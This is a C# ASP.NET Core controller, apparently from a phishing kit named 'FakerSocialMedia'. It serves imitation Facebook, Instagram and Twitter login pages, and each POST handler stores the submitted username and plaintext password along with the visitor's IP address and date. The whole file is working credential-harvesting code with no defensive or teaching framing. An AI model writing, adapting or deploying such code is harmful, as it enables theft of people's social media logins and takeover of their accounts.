using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using FakerSocialMedia.DataAccessLayer.Concrete;
using FakerSocialMedia.Models;
using Microsoft.AspNetCore.Mvc;

namespace FakerSocialMedia.Controllers
{
    public class LoginController : Controller
    {

        /* Add Operations This Page */
        RecordOperations recordOperations = new RecordOperations("Records");

        /* Facebook GET and POST*/
        [Route("~/facebook")]
        public IActionResult Facebook()
        {
            return View();
        }

        [HttpPost]
        [Route("~/facebook")]
        public IActionResult Facebook(Record record)
        {
            if (record.Username != null && record.Password != null)
            {
                if (record.Username.Length > 1 && record.Password.Length > 1)
                {
                    record.CreatedDate = DateTime.Now.ToShortDateString();
                    record.CreatedDay = DateTime.Now.Day;
                    record.CreatedWeek = DateTime.Now.DayOfYear / 7;
                    record.CreatedMonth = DateTime.Now.Month;
                    record.CreatedYear = DateTime.Now.Year;
                    record.CreatedIp = HttpContext.Connection.RemoteIpAddress.ToString();
                    record.MediaName = "Facebook";

                    recordOperations.AddModel(record);
                    return View();
                }
                return View();
            }

            return View();
        }

        /* Instagram GET and POST*/
        [Route("~/instagram")]
        public IActionResult Instagram()
        {
            return View();
        }

        [HttpPost]
        [Route("~/instagram")]
        public IActionResult Instagram(Record record)
        {
            if (record.Username != null && record.Password != null)
            {
                if (record.Username.Length > 1 && record.Password.Length > 1)
                {
                    record.CreatedDate = DateTime.Now.ToShortDateString();
                    record.CreatedDay = DateTime.Now.Day;
                    record.CreatedWeek = DateTime.Now.DayOfYear / 7;
                    record.CreatedMonth = DateTime.Now.Month;
                    record.CreatedYear = DateTime.Now.Year;
                    record.CreatedIp = HttpContext.Connection.RemoteIpAddress.ToString();
                    record.MediaName = "Instagram";

                    recordOperations.AddModel(record);
                    return View();
                }
                return View();
            }

            return View();
        }

        /* Twitter GET and POST*/
        [Route("~/twitter")]
        public IActionResult Twitter()
        {
            return View();
        }

        [HttpPost]
        [Route("~/twitter")]
        public IActionResult Twitter(Record record)
        {
            if (record.Username != null && record.Password != null)
            {
                if (record.Username.Length > 1 && record.Password.Length > 1)
                {
                    record.CreatedDate = DateTime.Now.ToShortDateString();
                    record.CreatedDay = DateTime.Now.Day;
                    record.CreatedWeek = DateTime.Now.DayOfYear / 7;
                    record.CreatedMonth = DateTime.Now.Month;
                    record.CreatedYear = DateTime.Now.Year;
                    record.CreatedIp = HttpContext.Connection.RemoteIpAddress.ToString();
                    record.MediaName = "Twitter";

                    recordOperations.AddModel(record);
                    return View();
                }
                return View();
            }

            return View();
        }

    }
}